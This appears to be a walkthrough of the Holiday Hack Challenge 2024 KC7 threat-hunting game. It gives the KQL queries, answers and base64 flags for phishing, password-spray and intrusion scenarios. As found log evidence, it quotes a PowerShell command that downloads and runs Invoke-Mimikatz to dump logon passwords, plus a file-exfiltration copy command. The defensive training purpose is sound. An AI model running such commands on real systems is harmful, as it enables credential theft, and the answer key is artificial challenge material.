Walk a few steps to the East and click on 'The Great Elf Conflict'

> ![](attachments/Pasted%20image%2020241201182037.png)
> 
> This opens the website https://kc7cyber.com/go/hhc24 in a new tab

Create a new account on the kc7cyber.com website


---


> #### Section 1 - KQL 101
> 
> ###### Section 1 - Question 1:
> Type "let’s do this" to begin your KQL training.

```
let's do this
```

 > ###### Section 1 - Question 2
 > Once you've examined all the tables, type when in doubt take 10 to proceed.
 >
> ~~~sql
> database('NorthPoleWorkshop').Employees
> | take 10
> ~~~

```
when in doubt take 10
```

> ###### Section 1 - Question 3
> How many elves did you find?
>
> ~~~sql
> database('NorthPoleWorkshop').Employees
> | count
> ~~~

```
90
```

> ###### Section 1 - Question 4
> Can you find out the name of the Chief Toy Maker?
> 
> ~~~sql
> database('NorthPoleWorkshop').Employees
> | where role == "Chief Toy Maker"
> | distinct name
> ~~~

```
Shinny Upatree
```

> ###### Section 1 - Question 5
> Type "operator" to continue.

```
operator
```

> ###### Section 1 - Question 6
> How many emails did Angel Candysalt receive?
>
> ~~~sql
> let email_address = database('NorthPoleWorkshop').Employees
> | where name contains "candysalt"
> | distinct email_addr;
> database('NorthPoleWorkshop').Email
> | where recipient in (email_address)
> | count
> ~~~

```
31
```

> ###### Section 1 - Question 7
> How many distinct recipients were seen in the email logs from twinkle_frostington@santaworkshopgeeseislands.org?
> 
> ~~~sql
> database('NorthPoleWorkshop').Email
> | where sender == "twinkle_frostington@santaworkshopgeeseislands.org"
> | distinct recipient
> | count
> ~~~

```
32
```

> ###### Section 1 - Question 8
> How many distinct websites did Twinkle Frostington visit?
> 
> ~~~sql
> let twinkles_ip = database('NorthPoleWorkshop').Employees
> | where name contains "Twinkle Frostington"
> | distinct ip_addr;
> database('NorthPoleWorkshop').OutboundNetworkEvents
> | where src_ip in (twinkles_ip)
> | distinct url
> | count
> ~~~

```
4
```

> ###### Section 1 - Question 9
> How many distinct domains in the PassiveDns records contain the word green?
> 
> ~~~sql
> database('NorthPoleWorkshop').PassiveDns
> | where domain contains "green"
> | distinct domain
> | count
> ~~~

```
10
```

> ###### Section 1 - Question 10
> How many distinct URLs did elves with the first name Twinkle visit?
>
> ~~~sql
> let twinkle_ips =
> database('NorthPoleWorkshop').Employees
> | where name has "Twinkle"
> | distinct ip_addr;
> database('NorthPoleWorkshop').OutboundNetworkEvents  
> | where src_ip in (twinkle_ips)  
> | distinct url
> | count
> ~~~

```
8
```


---


> #### Section 2 - Operation Surrender
> 
> ###### Section 2 - Question 1
> Type "surrender" to get started!

```
surrender
```

> ###### Section 2 - Question 2
> Who was the sender of the phishing email that set this plan into motion?
> 
> ~~~sql
> database('NorthPoleWorkshop').Email
> | where subject contains "surrender"
> | where verdict != "CLEAN"
> | distinct sender
> ~~~

```
surrender@northpolemail.com
```

> ###### Section 2 - Question 3
> How many elves from Team Wombley received the phishing email?
> 
> ~~~sql
> let womblies =
> database('NorthPoleWorkshop').Employees
> | where hostname contains "-W-"
> | distinct username;
> database('NorthPoleWorkshop').Email
> | where sender contains "surrender"
> | distinct recipient
> | count
> ~~~

```
22
```

> ###### Section 2 - Question 4
> What was the filename of the document that Team Alabaster distributed in their phishing email?
> 
> ~~~sql
> let womblies =
> database('NorthPoleWorkshop').Employees
> | where hostname contains "-W-"
> | distinct username;
> database('NorthPoleWorkshop').Email
> | where sender contains "surrender"
> | extend filename = replace_regex(link, '^.*[/]', "")
> | project filename
> | distinct filename
> ~~~

```
Team_Wombley_Surrender.doc
```

> ###### Section 2 - Question 5
> Who was the first person from Team Wombley to click the URL in the phishing email?
>
> ~~~sql
> database('NorthPoleWorkshop').Employees
> | join kind=inner (OutboundNetworkEvents) 
>    on $left.ip_addr == $right.src_ip
> | where url contains "Team_Wombley_Surrender.doc"
> | project name, ip_addr, url, timestamp
> | top 1 by timestamp asc
> | distinct name
> ~~~

```
Joyelle Tinseltoe
```

> ###### Section 2 - Question 6
> What was the filename that was created after the .doc was downloaded and executed?
>
> ~~~sql
> let download_time = toscalar(database('NorthPoleWorkshop').Employees
> | join kind=inner (OutboundNetworkEvents)
>   on $left.ip_addr == $right.src_ip
> | where url contains "Team_Wombley_Surrender.doc"
> | project name, ip_addr, url, timestamp
> | top 1 by timestamp asc
> | distinct timestamp);
> database('NorthPoleWorkshop').FileCreationEvents
> | where timestamp > make_datetime(download_time)
> | where filename != "Team_Wombley_Surrender.doc"
> | where hostname == "Elf-Lap-W-Tinseltoe"
> | top 1 by timestamp asc 
> | distinct filename
> ~~~

```
keylogger.exe
```

> ###### Section 2 - Question 7
> To obtain your flag use the KQL below with your last answer!
> 
> ~~~sql
> let flag = "keylogger.exe";
> let base64_encoded = base64_encode_tostring(flag);
> print base64_encoded
> ~~~

```
a2V5bG9nZ2VyLmV4ZQ==
```



---


> #### Section 3 - Operation Snowfall
> 
> ###### Section 3 - Question 1
> Type "snowfall" to begin

```
snowfall
```

> ###### Section 3 - Question 2
> What was the IP address associated with the password spray?
> 
> ~~~sql
> database('NorthPoleWorkshop').AuthenticationEvents
> | where result == "Failed Login"
> | summarize users_sprayed_by_ip = count_distinct(username) by src_ip
> | top 1 by users_sprayed_by_ip desc
> | distinct src_ip
> ~~~

```
59.171.58.12
```

> ###### Section 3 - Question 3
> How many unique accounts were impacted where there was a successful login from 59.171.58.12?
> 
> ~~~sql
> database('NorthPoleWorkshop').AuthenticationEvents
> | where result == "Successful Login"
> | where src_ip == "59.171.58.12"
> | distinct username
> | count
> ~~~

```
23
```

> ###### Section 3 - Question 4
> What service was used to access these accounts/devices?
> 
> ~~~sql
> let ip_address = "59.171.58.12";
> let logons = database('NorthPoleWorkshop').AuthenticationEvents
> | where src_ip == ip_address
> | where result == "Successful Login"
> | distinct username;
> let results = search *
> | where src_ip == ip_address
> | where username in (logons)
> | where result == "Successful Login";
> results 
> | project description
> ~~~

```
RDP
```

> ###### Section 3 - Question 5
> What file was exfiltrated from Alabaster’s laptop?
> 
> ~~~sql
> let ip_address = "59.171.58.12";
> let logons = database('NorthPoleWorkshop').AuthenticationEvents
> | where src_ip == ip_address
> | where result == "Successful Login"
> | distinct username;
> let rdp_time = toscalar(search *
> | where src_ip == ip_address
> | where username in (logons)
> | where hostname == "Elf-Lap-A-Snowball"
> | where result == "Successful Login"
> | distinct timestamp);
> database('NorthPoleWorkshop').ProcessEvents
> | where hostname == "Elf-Lap-A-Snowball"
> | where timestamp > make_datetime(rdp_time)
> ~~~

> [!NOTE]
> copy C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip \\wocube\share\alsnowball\Secret_Files.zip
> This command exfiltrates the file 'Secret_Files.zip' to a remote server 'wocube'

```
Secret_Files.zip
```

> ###### Section 3 - Question 6
> What is the name of the malicious file that was run on Alabaster's laptop?
> ~~~sql
> let ip_address = "59.171.58.12";
> let logons = database('NorthPoleWorkshop').AuthenticationEvents
> | where src_ip == ip_address
> | where result == "Successful Login"
> | distinct username;
> let rdp_time = toscalar(search *
> | where src_ip == ip_address
> | where username in (logons)
> | where hostname == "Elf-Lap-A-Snowball"
> | where result == "Successful Login"
> | distinct timestamp);
> database('NorthPoleWorkshop').ProcessEvents
> | where hostname == "Elf-Lap-A-Snowball"
> | where timestamp > make_datetime(rdp_time)
> ~~~

> [!NOTE]
> C:\Windows\Users\alsnowball\EncryptEverything.exe

```
EncryptEverything.exe
```

> ###### Section 3 - Question 7
> To obtain your flag use the KQL below with your last answer!
> 
> ~~~sql
> let flag = "EncryptEverything.exe";
> let base64_encoded = base64_encode_tostring(flag);
> print base64_encoded
> ~~~

```
RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl
```


---


>
> #### Section 4 - Echoes in the Frost
> 
> ###### Section 4 - Question 1
> Type "stay frosty" to begin

```
stay frosty
```

> ###### Section 4 - Question 2
> What was the timestamp of first phishing email about the breached credentials received by Noel Boetie?
>
> ~~~sql
> database('NorthPoleWorkshop').Email
> | where recipient == "noel_boetie@santaworkshopgeeseislands.org"
> | where subject contains "breach"
> | top 1 by timestamp asc
> | distinct timestamp
> ~~~

```
2024-12-12T14:48:55Z
```

> ###### Section 4 - Question 3
> When did Noel Boetie click the link to the first file?
> 
> ~~~sql
> let noels_ip = database('NorthPoleWorkshop').Employees
> | where username contains "Boetie"
> | distinct ip_addr;
> let notification_time = toscalar(database('NorthPoleWorkshop').Email
> | where recipient == "noel_boetie@santaworkshopgeeseislands.org"
> | where subject contains "breach"
> | top 1 by timestamp asc
> | distinct timestamp);
> database('NorthPoleWorkshop').OutboundNetworkEvents
> | where src_ip in (noels_ip)
> | where timestamp > make_datetime(notification_time)
> | top 1 by timestamp asc
> | distinct timestamp
> ~~~

```
2024-12-12T15:13:55Z
```

> ###### Section 4 - Question 4
> What was the IP for the domain where the file was hosted?
> 
> ~~~sql
> let ip = database('NorthPoleWorkshop').Employees
> | where name contains "Noel"
> | distinct ip_addr;
> let urls = database('NorthPoleWorkshop').OutboundNetworkEvents
> | where src_ip in (ip)
> | where timestamp > (datetime("2024-12-12T14:48:55Z"))
> | project url;
> let domains = urls 
> | extend Domain = extract(@"https?://([^/]+)", 1, url) // Extract the domain
> | project Domain;
> database('NorthPoleWorkshop').PassiveDns
> | where domain in (domains)
> | distinct ip
> ~~~

```
182.56.23.122
```

> ###### Section 4 - Question 5
> what hostname was accessed?
> 
> ~~~sql
> database('NorthPoleWorkshop').AuthenticationEvents
> | where src_ip == "182.56.23.122"
> | distinct hostname
> ~~~

```
WebApp-ElvesWorkshop
```

> ###### Section 4 - Question 6
> What was the script that was run to obtain credentials?
>
> ~~~sql
> database('NorthPoleWorkshop').ProcessEvents
> | where hostname == "WebApp-ElvesWorkshop"
> ~~~

> [!NOTE]
> powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString("https://raw[.]githubusercontent[.]com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz[.]ps1"); Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords"

```
Invoke-Mimikatz.ps1
```

> ###### Section 4 - Question 7
> What is the timestamp where Noel executed the file?
>
> ~~~sql
> database('NorthPoleWorkshop').ProcessEvents
> | where hostname contains "Boetie"
> ~~~

> [!NOTE]
> Explorer.exe "C:\Users\noboetie\Downloads\echo.exe"

```
2024-12-12T15:14:38Z
```

> ###### Section 4 - Question 8
> What domain was the holidaycandy.hta file downloaded from?
> 
> ~~~sql
> database('NorthPoleWorkshop').OutboundNetworkEvents
> | where src_ip == "10.10.0.9"
> | where url contains "hta"
> | distinct url
> | project url = extract("(.*)://([^/]*)", 2, url)
> ~~~

```
compromisedchristmastoys.com
```

> ###### Section 4 - Question 9
> what was the first file that was created after extraction?
> 
> ~~~sql
> let download_time = toscalar(database('NorthPoleWorkshop').ProcessEvents
> | where hostname contains "Boetie"
> | where process_commandline contains "frosty.txt"
> | distinct timestamp);
> database('NorthPoleWorkshop').FileCreationEvents
> | where hostname contains "Boetie"
> | where timestamp > make_datetime(download_time)
> | top 1 by timestamp asc
> | distinct filename
> ~~~

```
sqlwriter.exe
```

> ###### Section 4 - Question 10
> What is the name of the property assigned to the new registry key?
> 
> ~~~sql
> database('NorthPoleWorkshop').ProcessEvents
> | where hostname contains "boet"
> | where process_commandline contains "property"
> | distinct process_commandline
> | project url = extract('(.*ItemProperty.*")(.*)(".*Value.*)', 2, process_commandline)
> ~~~

```
frosty
```

> ###### Section 4 - Question 11
> To obtain your FINAL flag use the KQL below with your last answer!
>
> ~~~sql
> let finalflag = "frosty";
> let base64_encoded = base64_encode_tostring(finalflag);
> print base64_encoded
> ~~~

```
ZnJvc3R5
```


---


> [!NOTE] Open the Holiday Hack Challenge game:

> ### Silver Medal
> 
> Click your Avatar's Snowball
>
> 'Objectives' -> 'Microsoft KC7' -> 'KQL 101':

```
8
```

> 'Objectives' -> 'Microsoft KC7' -> 'Operation Surrender'

```
a2V5bG9nZ2VyLmV4ZQ==
```

> 
> ### Gold Medal
> 
> 'Objectives' -> 'Microsoft KC7' -> 'Operation Snowfall'

```
RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl
```

> 'Objectives' -> 'Microsoft KC7' -> 'Echoes in the Frost'

```
ZnJvc3R5
```

> Completing four chapters will award the Gold medal.
> 
> Medal progress:
> 
> ![](attachments/Pasted%20image%2020241201222844.png)